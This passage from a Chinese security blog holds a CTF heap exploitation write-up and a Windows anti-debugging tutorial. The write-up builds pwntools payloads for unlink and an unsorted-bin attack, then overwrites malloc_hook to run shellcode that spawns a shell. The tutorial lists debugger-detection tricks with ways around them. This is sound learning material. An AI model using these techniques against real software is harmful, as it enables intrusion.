0x6020D0</p><p><strong>即数组的第1个元素被我们改成了0x6020C8，也就是相当于堆0指向了0x6020C8</strong></p><p><strong>那么，我们编辑堆0也就是在编辑0x6020C8处，而此处的下方就是保存堆指针的数组，那么就可以构造payload来修改这个数组，这就是原理</strong></p><p>目的：通过malloc_hook来执行shellcode,只要把 malloc_hook 赋值为shellcode的首地址，那么在执行malloc后就可以执行shellcode了,而地址随机化的堆空间并不适合写入shellcode，要选择一片<strong>可写入的</strong>，<strong>较稳定的</strong>内存段（比如bss段），利用<strong>堆溢出</strong>修改<strong>chunk的结构</strong>，通过<strong>unlink</strong>修改buf数组中指针指向的位置（使其指向bss段），利用update()把shellcode写入bss段，然后再利用undate()修改malloc_hook为bss段上shellcode的地址，最后执行 shellcode.</p><p>步骤如下：</p><blockquote><p>In 64-bit, all the chunk data takes up <code>0x8</code> bytes each, so the offsets for <code>fd</code> and <code>bk</code> will be <code>0x10</code> and <code>0x18</code> respectively.</p></blockquote><p>step1:在堆上创建两个chunk（0x90），伪造堆结构如下，delete()删掉chunk1触发unlink操作</p><img src="/2021/06/29/heapnote/Untitled15.png" class title="Untitled"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pre_size, size</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)<span class="comment">#最后一位为1（伪造P位）</span></span><br><span class="line"><span class="comment"># fd, bk</span></span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) + p64(buf - <span class="number">0x10</span>)<span class="comment">#伪造unlink的执行条件</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line"><span class="comment"># change chunk1 size</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)<span class="comment">#最后一位为0（伪造P位，使伪造chunk为free）</span></span><br><span class="line"><span class="comment">#fake chunk:0x90-0x10=0x80</span></span><br><span class="line"><span class="comment">#chunk1:0x90+0x10=0xa0</span></span><br><span class="line"><span class="comment">#new chunk:0x90+0x90=0x80+0xa0=0x120</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line">free(<span class="string">&quot;1&quot;</span>)<span class="comment">#merge completed</span></span><br></pre></td></tr></table></figure><p>chunk-&gt;fd：“buf - 0x18”，buf[-3]</p><p>chunk-&gt;bk：“buf - 0x10”，buf[-2]</p><p>unlink之后buf[0]的地址实际指向了buf[-3]的地址</p><p>step2:调用edit编辑buf[0]，此时buf[0]指向bss段首部，buf[1]指向buf，并且我们在buf中又伪造了一个chunk，buf结构如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment">#填充buf[-3]~buf[-1]</span></span><br><span class="line">payload+=p64(bss_addr)+p64(buf_addr)<span class="comment">#buf[0]-&gt;bss  buf[1]-&gt;buf 改变buf数组指针指向bss，方便写入shellcode</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#new chunk:chunk2,chunk3</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)<span class="comment">#size(buf[4])  pre_size(buf[5])</span></span><br><span class="line"><span class="comment">#make a fake chunk in buf(the head is buf[4])</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br></pre></td></tr></table></figure><img src="/2021/06/29/heapnote/Untitled16.png" class title="Untitled"><p>step4:申请chunk23，要利用UAF、unsortbin attack将arena_main的地址写入chunk4,将malloc_hook地址写入buf。此时buf[2]指向的地址为buf[0]，也是正常malloc时候的地址+0x10，这是因为我们free buf[1]时进行了合并，chunk1和伪造的chunk0都合并进入了top chunk。</p><p>前面伪造chunk0和chunk1合并后，在<strong>top chunk</strong>中存放有一个“0x90+0x90+0x10”大小的free chunk</p><p>在申请第一段“0x100”的chunk时，<strong>top chunk</strong>中的chunk被切割为“0x90”</p><p>在申请第二段“0x100”的chunk时，<strong>top chunk</strong>中的chunk大小不够，需要继续申请</p><p> &#x2F;&#x2F;这里是为了把<strong>top chunk</strong>消耗干净，让chunk3成为新的<strong>top chunk</strong></p><img src="/2021/06/29/heapnote/Untitled17.png" class title="Untitled"><blockquote><p>这里将malloc_hook地址写入buf数组的原因：由于程序开启了ALSR保护，所以malloc_hook地址是会随机变化的，这说明我们不可能直接将malloc_hook地址直接写入buf，我们只能在不确定中寻找确定。在上面的引用中，我们发现当我们free掉一个大小属于unsorted bin的chunk时，它都会指向main_arena的固定偏移位置，因此，我们可以利用这一特点，将这一偏移地址存放在buf数组中，形成可读可写的状态，将处于同一内存页的malloc_hook的地址通过编辑功能修改得到。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk2</span></span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[3]&quot;</span>)<span class="comment">#buf[3]-&gt;chunk3 把topchunk消耗干净，让chunk3成为新的topchunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">&quot;2&quot;</span>)<span class="comment">#,chunk2(buf[2]指向的chunk)作为最后一个收入unsortbin</span></span><br><span class="line"><span class="comment">#no merge:chunk1&amp;chunk3 are all allocated chunks</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(buf_addr+<span class="number">0x8</span>*<span class="number">4</span>) <span class="comment">#fd-&gt;null(0)  bk-&gt;buf[4](fake chunk) chunk2已经是free状态</span></span><br><span class="line">change(<span class="string">&quot;2&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload) <span class="comment">#这样的话之前在buf中伪造的chunk4也进入了unsorted bin</span></span><br><span class="line"><span class="comment">#link fake chunk4 into unsorted bin</span></span><br></pre></td></tr></table></figure><p>堆结构从</p><img src="/2021/06/29/heapnote/Untitled18.png" class title="Untitled"><p>改变为</p><img src="/2021/06/29/heapnote/Untitled19.png" class title="Untitled"><p>step5:</p><p>再调用add申请一个和chunk2一样大小的chunk，这样unsorted bin中就只剩下伪造的chunk4，所以main arena+0x58的地址就被留在了buf[6]。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk4</span></span><br><span class="line"><span class="comment">#chunk2 is used,fake chunk4 is the only one in unsorted bin</span></span><br><span class="line"><span class="comment">#buf[6]-&gt;main arena+0x58  buf[7]-&gt;main arena+0x58</span></span><br></pre></td></tr></table></figure><p>因为“chunk2”属于“unsorted bin”，其<strong>bk</strong>指向“buf[4]”（“伪造的chunk4”的首地址）</p><p>这样的话之前在buf中伪造的“伪造的chunk4”也进入了unsorted bin（被强行连接）</p><p>添加一个和chunk2一样大小的chunk4，这样unsorted bin中只剩下伪造的chunk4了</p><p>这里需要先分析一下ptmalloc的运算过程：</p><p>申请chunk4时，程序在small bins中没有找到结果，于是在unsorted bin中进行<strong>遍历</strong></p><p>因为“chunk2”排在“伪造的chunk4”前面，所以程序搜索到“chunk2”后<strong>终止</strong>，并不会<strong>重新分配</strong>“伪造的chunk4”</p><p>step6:调用edit向buf[0]（bss首部）中写入shellcode</p><p>调用edit向buf[6]中写入shellcode的地址</p><p>&#x2F;&#x2F;改写main_arena的地址低位使其指向malloc_hook,将shellcode地址写入malloc_hook</p><p>申请任意一个新chunk，触发mallochook执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(bss_addr)+p64(buf_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x10&#x27;</span></span><br><span class="line">change(<span class="string">&quot;1&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line"><span class="comment">#main arena+0x58 become malloc_hook</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(shellcode)),shellcode)<span class="comment">#bss=&amp;shellcode buf[0]装有bss段的首地址，所以shellcode会被写入bss段，且首地址已知</span></span><br><span class="line">change(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;8&quot;</span>,p64(bss_addr))<span class="comment">#malloc_hook-&gt;bss(&amp;shellcode) buf[6]中装有malloc_hook，所以malloc_hook会和shellcode挂钩</span></span><br></pre></td></tr></table></figure><p>buf[1]中写入了buf[0]的地址，buf[0]中写入了bss段的地址</p><p>buf[4]是伪造chunk4，在它就是<strong>unsorted bin</strong>中的<strong>最后一位</strong>，所以它的<strong>fd&amp;bk</strong>应该指向一个固定偏移<strong>main_arena+XX</strong>，这里不需要知道它具体是多少，只要知道它和<strong>malloc_hook</strong>只有最后两位不同就可以了</p><p>在buf[1]中写入payload，而payload会实际写入buf[0]，前面的数据会依次填充“buf[0]~buf[5]”，而最后一位数据“\x10”会<strong>填入fd</strong>，因为计算机采用<strong>小端序</strong>，所以“\x10”会覆盖<strong>fd</strong>指针指向内容的最后两个字节，它正是<strong>main_arena+XX</strong>，它会被覆盖为<strong>malloc_hook</strong>（在malloc_trim()里找到）</p><img src="/2021/06/29/heapnote/Untitled20.png" class title="Untitled">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>anti-debugging(windows)</title>
      <link href="/2020/07/09/anti-debugging-windows/"/>
      <url>/2020/07/09/anti-debugging-windows/</url>
      
        <content type="html"><![CDATA[<h1 id="静态反调试技术："><a href="#静态反调试技术：" class="headerlink" title="静态反调试技术："></a><strong>静态反调试技术：</strong></h1><p>许多反调试对OS有较强的依赖性。</p><p>利用PEB结构体的一些信息可以判断反调试。</p><h2 id="PEB结构体中与反调试密切相关的成员："><a href="#PEB结构体中与反调试密切相关的成员：" class="headerlink" title="PEB结构体中与反调试密切相关的成员："></a><strong>PEB结构体中与反调试密切相关的成员：</strong></h2><p>BeingDebugged（一个标志，表示进程是否处于被调试状态）</p><p>NtGlobalFlag(与被调试进程堆栈有关)</p><h3 id="BeingDebugged："><a href="#BeingDebugged：" class="headerlink" title="BeingDebugged："></a><strong>BeingDebugged：</strong></h3><p>进程处于被调试状态时，BeingDebugged（+0x2）的值被设置为1，未调试状态则为0；</p><p>可以通过IsDebuggerPresent()函数获取该值来判断是否处于调试状态。</p><h3 id="破解之法："><a href="#破解之法：" class="headerlink" title="破解之法："></a><strong>破解之法：</strong></h3><p>将该标志位设置为0即可</p><h3 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag:"></a><strong>NtGlobalFlag:</strong></h3><p>调试进程时，被调试进程堆内存有特殊标志，NtGlobalFlag（+0x68）的值被设置为0x70.</p><h3 id="破解之法：-1"><a href="#破解之法：-1" class="headerlink" title="破解之法："></a><strong>破解之法：</strong></h3><p>将该标志位设置为0即可</p><p>将运行进程附加到调试器，该标志位不变。</p><h2 id="NtQueryInformationProcess"><a href="#NtQueryInformationProcess" class="headerlink" title="NtQueryInformationProcess():"></a><strong>NtQueryInformationProcess():</strong></h2><p>通过该函数可以获取与进程相关的信息，函数定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQueryInformationProcess(</span><br><span class="line">  [in]            HANDLE           ProcessHandle,</span><br><span class="line">  [in]            PROCESSINFOCLASS ProcessInformationClass,</span><br><span class="line">  [out]           PVOID            ProcessInformation,</span><br><span class="line">  [in]            ULONG            ProcessInformationLength,</span><br><span class="line">  [out, optional] PULONG           ReturnLength</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in] ProcessInformationClass</span><br></pre></td></tr></table></figure><p>此参数可以是<strong>PROCESSINFOCLASS</strong>枚举中的值。</p><p>其中与调试器探测相关的成员有：</p><p>ProcessDebugPort，ProcessDebugObjectHandle，ProcessDebugFlags。</p><h3 id="ProcessDebugPort（-0x7）："><a href="#ProcessDebugPort（-0x7）：" class="headerlink" title="ProcessDebugPort（+0x7）："></a><strong>ProcessDebugPort（+0x7）：</strong></h3><p>ProcessInformationClass参数值设置为ProcessDebugPort，调用NtQueryInformationProcess()函数就能获取调试端口。若进程处于调试状态，dwDebugPort设置为0，否则，设置为0xFFFFFFFF。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwDebugPort = 0;</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(),</span><br><span class="line">ProcessDebugPort,</span><br><span class="line">&amp;dwDebugPort,</span><br><span class="line">sizeof(dwDebugPort),</span><br><span class="line">NULL</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CheckRemoteDebuggerPresent"><a href="#CheckRemoteDebuggerPresent" class="headerlink" title="CheckRemoteDebuggerPresent():"></a><strong>CheckRemoteDebuggerPresent():</strong></h3><p>该函数可以检查当前进程和其他进程是否处于被调试状态。该函数也调用了NtQueryInformation Process()函数。</p><h3 id="ProcessDebugObjectHandle-0x1E"><a href="#ProcessDebugObjectHandle-0x1E" class="headerlink" title="ProcessDebugObjectHandle(+0x1E):"></a><strong>ProcessDebugObjectHandle(+0x1E):</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DWORD hDebugObject = NULL;</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(),</span><br><span class="line">ProcessDebugObjectHandle,</span><br><span class="line">&amp;hDebugObject,</span><br><span class="line">sizeof(hDebugObject),</span><br><span class="line">NULL</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用函数，调试状态时第三个参数为调试对象句柄，非调试状态则为NULL。</p><h3 id="ProcessDebugFlags（-0x1F）："><a href="#ProcessDebugFlags（-0x1F）：" class="headerlink" title="ProcessDebugFlags（+0x1F）："></a><strong>ProcessDebugFlags（+0x1F）：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DWORD bDebugFlag = TRUE;</span><br><span class="line">NtQueryInformationProcess(GetCurrentProcess(),</span><br><span class="line">ProcessDebugFlags,</span><br><span class="line">&amp;bDebugFlag,</span><br><span class="line">sizeof(bDebugFlag),</span><br><span class="line">NULL</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用函数第三个参数可获取到调试标志位。为0处于被调试状态，为1则为非调试。</p><h3 id="破解之法：-2"><a href="#破解之法：-2" class="headerlink" title="破解之法："></a><strong>破解之法：</strong></h3><p>若只调用几次函数，可以手动设置值，如果反复调用，则需要使用API钩取技术。（钩取时最好从函数第二个字节钩取，有些保护器会检查第一个字节来判断是否被钩取）。</p><h2 id="NtQuerySystemInformation（）："><a href="#NtQuerySystemInformation（）：" class="headerlink" title="NtQuerySystemInformation（）："></a><strong>NtQuerySystemInformation（）：</strong></h2><p>基于调试环境检测的反调试技术。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSTATUS NtQuerySystemInformation(</span><br><span class="line">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  [in, out]       PVOID                    SystemInformation,</span><br><span class="line">  [in]            ULONG                    SystemInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>SYSTEM_INFORMATION_CLASS SystemInformationClass参数指定需要的系统信息类型，</p><p>将结构体地址传递给 PVOID SystemInformation。</p><p>SYSTEM_INFORMATION_CLASS是枚举类型</p><p>判断OS是否处于调试模式下运行的参数：</p><h3 id="SystemKernelDebuggerInformation（0x23）："><a href="#SystemKernelDebuggerInformation（0x23）：" class="headerlink" title="SystemKernelDebuggerInformation（0x23）："></a><strong>SystemKernelDebuggerInformation（0x23）：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NtQuerySystemInformation(SystemKernelDebuggerInformation,</span><br><span class="line">（PVOID）&amp;DebuggerInfo,</span><br><span class="line">sizeof(DebuggerInfo),</span><br><span class="line">&amp;ulReturnedLength</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一个参数为SystemKernelDebuggerInformation时，第二个参数为结构体SYSTEM_KERNEL_DEBUGGER_INFORMATION的地址。若系统处于调试状态，SYSTEM_KERNEL_DEBUGGER_INFORMATION.DebuggerEnabled值设置为1.</p><h2 id="NtQueryObject-："><a href="#NtQueryObject-：" class="headerlink" title="NtQueryObject()："></a><strong>NtQueryObject()：</strong></h2><p>NtQueryObject()可获取内核对象信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__kernel_entry NTSYSCALLAPI NTSTATUS NtQueryObject(</span><br><span class="line">  [in, optional]  HANDLE                   Handle,</span><br><span class="line">  [in]            OBJECT_INFORMATION_CLASS ObjectInformationClass,</span><br><span class="line">  [out, optional] PVOID                    ObjectInformation,</span><br><span class="line">  [in]            ULONG                    ObjectInformationLength,</span><br><span class="line">  [out, optional] PULONG                   ReturnLength</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef enum _OBJECT_INFORMATION_CLASS &#123;</span><br><span class="line">    ObjectBasicInformation,</span><br><span class="line">    ObjectNameInformation,</span><br><span class="line">    ObjectTypeInformation,</span><br><span class="line">    ObjectAllTypesInformation,</span><br><span class="line">    ObjectHandleInformation</span><br><span class="line">&#125; OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先使用ObjectAllTypesInformation获取系统所有对象信息，然后检测是否存在调试对象。</p><h3 id="NtQueryObject-使用方法："><a href="#NtQueryObject-使用方法：" class="headerlink" title="NtQueryObject()使用方法："></a><strong>NtQueryObject()使用方法：</strong></h3><h3 id="1-获取内核对象信息链表："><a href="#1-获取内核对象信息链表：" class="headerlink" title="1.获取内核对象信息链表："></a><strong>1.获取内核对象信息链表：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ULONG lSize = 0</span><br><span class="line"></span><br><span class="line">pNtQueryObject(NULL,ObjectAllTypesInformation,&amp;Size,sizeof(lSize),&amp;lSize);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-分配内存："><a href="#2-分配内存：" class="headerlink" title="2.分配内存："></a><strong>2.分配内存：</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void *pBuf = NULL;</span><br><span class="line">pBuf = VirtualAlloc(NULL,lSize,MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-获取内核对象信息链表"><a href="#3-获取内核对象信息链表" class="headerlink" title="3.获取内核对象信息链表:"></a><strong>3.获取内核对象信息链表:</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> typedef struct _OBJECT_TYPE_INFORMATION &#123;</span><br><span class="line">        UNICODE_STRING TypeName;</span><br><span class="line">        ULONG TotalNumberOfHandles;</span><br><span class="line">        ULONG TotalNumberOfObjects;</span><br><span class="line">    &#125;OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;</span><br><span class="line"></span><br><span class="line">    typedef struct _OBJECT_ALL_INFORMATION &#123;</span><br><span class="line">        ULONG                   NumberOfObjectsTypes;</span><br><span class="line">        OBJECT_TYPE_INFORMATION ObjectTypeInformation[1];</span><br><span class="line">    &#125; OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;</span><br><span class="line"></span><br><span class="line">pNtQueryObject((HANDLE)0xFFFFFFFF, ObjectAllTypesInformation, pBuf, lSize, NULL);</span><br><span class="line">POBJECT_ALL_INFORMATION pObjectAllInfo = (POBJECT_ALL_INFORMATION)pBuf;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用函数后，所有对象信息代码被存入pBuf，将pBuf转化为OBJECT_ALL_INFORMATION类型。OBJECT_ALL_INFORMATION结构体由OBJECT_TYPE_INFORMATION结构体数组组成。实际内核对象存储在OBJECT_TYPE_INFORMATION结构体数组中，通过循环检索即可查看是否存在“调试对象”对象类型。</p><h3 id="4-确定”调试对象“对象类型。"><a href="#4-确定”调试对象“对象类型。" class="headerlink" title="4.确定”调试对象“对象类型。"></a><strong>4.确定”调试对象“对象类型。</strong></h3><h3 id="破解之法：-3"><a href="#破解之法：-3" class="headerlink" title="破解之法："></a><strong>破解之法：</strong></h3><p>在调用NtQueryObject()时第二个参数ObjectAllTypesInformation（3）将该值修改为0即可。</p><h2 id="ZwSetInformationThread"><a href="#ZwSetInformationThread" class="headerlink" title="ZwSetInformationThread():"></a><strong>ZwSetInformationThread():</strong></h2><p>该函数可以强制分离被调试者和调试器，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS ZwSetInformationThread(</span><br><span class="line">  [in] HANDLE          ThreadHandle,</span><br><span class="line">  [in] THREADINFOCLASS ThreadInformationClass,</span><br><span class="line">  [in] PVOID           ThreadInformation,</span><br><span class="line">  [in] ULONG           ThreadInformationLength</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二个参数表示线程信息类型，若其值设置为ThreadHideFromDebugger（0x11），调试该函数时，调试进程就被分离出来了。该函数不会对正常运行的程序产生任何影响，但若运行的是调试器程序，因为该函数隐藏了当前线程，调试器无法再收到该线程的调试事件，最终会停止调试。</p><p>还有一个函数 DebugActiveProcessStop 用来分离调试器和被调试进程，从而停止调试。</p><h3 id="破解之法：-4"><a href="#破解之法：-4" class="headerlink" title="破解之法："></a><strong>破解之法：</strong></h3><p>将第二个参数修改为0。</p><h2 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a><strong>ETC</strong></h2><p>比较直接的反调试技术FindWindow() -&gt;检测OllyDbg窗口CreateToolhelp32Snapshot()检测OllyDbg进程… …</p><p>一片比较好的文章：</p><p><a href="https://blog.csdn.net/Cody_Ren/article/details/79965186">反调试</a></p><h1 id="动态反调试："><a href="#动态反调试：" class="headerlink" title="动态反调试："></a><strong>动态反调试：</strong></h1><h2 id="异常："><a href="#异常：" class="headerlink" title="异常："></a><strong>异常：</strong></h2><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH:"></a><strong>SEH:</strong></h3><p>一些常见的异常：</p><h3 id="EXCEPTION-BREAKPOINT"><a href="#EXCEPTION-BREAKPOINT" class="headerlink" title="EXCEPTION_BREAKPOINT:"></a><strong>EXCEPTION_BREAKPOINT:</strong></h3><p>若程序处于调试状态，触发异常时，系统会立刻停掉运行程序，将控制权转给调试器。修改调试器选项可以把处理中的进程产生的异常转给操作系统，自动调用SEH。</p><p>触发异常时，pContext-&gt;Eip成员会保存处理完异常后的返回地址。</p><h3 id="SetUnhandledExceptionFilter"><a href="#SetUnhandledExceptionFilter" class="headerlink" title="SetUnhandledExceptionFilter():"></a><strong>SetUnhandledExceptionFilter():</strong></h3><p>当SEH未注册，或者不存在时，UnhandledExceptionFilter()函数内部会运行最后一个异常处理器，会弹出错误，然后终止程序。</p><p>该函数内部使用了NtQueryInformationProcess API，判断是否处于调试进程。</p><p>SetUnhandledExceptionFilter()可以修改程序最后的异常处理器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(</span><br><span class="line">  [in] LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只需要将新的TopLevelExceptionFilter传给lpTopLevelExceptionFilter即可。返回值为上一个函数的</p><p>Exception Filter.</p><h3 id="破解之法：-5"><a href="#破解之法：-5" class="headerlink" title="破解之法："></a><strong>破解之法：</strong></h3><p>先要让UnhandledExceptionFilter()函数内部调用的NtQueryInformationProcess API失效（API钩取技术）。然后调用SetUnhandledExceptionFilter()函数跟踪注册的Exception Filter，在正常运行时要调到哪个位置。</p><h2 id="Timing-Cheak："><a href="#Timing-Cheak：" class="headerlink" title="Timing Cheak："></a><strong>Timing Cheak：</strong></h2><p>该技术运用了检测运行时间来判断是否处于调试。</p><p>破解方法也很简单，直接修改判断语句就可以。</p><h3 id="时间间隔检测法："><a href="#时间间隔检测法：" class="headerlink" title="时间间隔检测法："></a><strong>时间间隔检测法：</strong></h3><p>大致两种方法：</p><h3 id="1-利用CPU计数器："><a href="#1-利用CPU计数器：" class="headerlink" title="1.利用CPU计数器："></a><strong>1.利用CPU计数器：</strong></h3><p>RDTSC</p><p>QueryPerformanceCounter&#x2F;NtQueryPerformanceCounter</p><p>GetTickCount</p><h3 id="2-利用系统实际时间："><a href="#2-利用系统实际时间：" class="headerlink" title="2.利用系统实际时间："></a><strong>2.利用系统实际时间：</strong></h3><p>timeGetTime（）</p><p>_ftime（）</p><h3 id="计数器准确度："><a href="#计数器准确度：" class="headerlink" title="计数器准确度："></a><strong>计数器准确度：</strong></h3><p>RDTSC&gt;NtQueryPerformanceCounter()&gt;GetTickCount()</p><h3 id="RDTSC"><a href="#RDTSC" class="headerlink" title="RDTSC:"></a><strong>RDTSC:</strong></h3><p>CPU对每个时钟周期进行计数,保存到TSC寄存器中.RDTSC是一条汇编指令,用来读取TSC值读入EDX:EAX中.</p><h3 id="破解之法"><a href="#破解之法" class="headerlink" title="破解之法:"></a><strong>破解之法:</strong></h3><p>直接run过这段代码</p><p>操作第二个RDTS的值</p><p>操做条件分支指令</p><h2 id="陷阱标志"><a href="#陷阱标志" class="headerlink" title="陷阱标志:"></a><strong>陷阱标志:</strong></h2><p>陷阱标志指EFLAGS寄存器的第九个比特位.</p><h3 id="单步执行"><a href="#单步执行" class="headerlink" 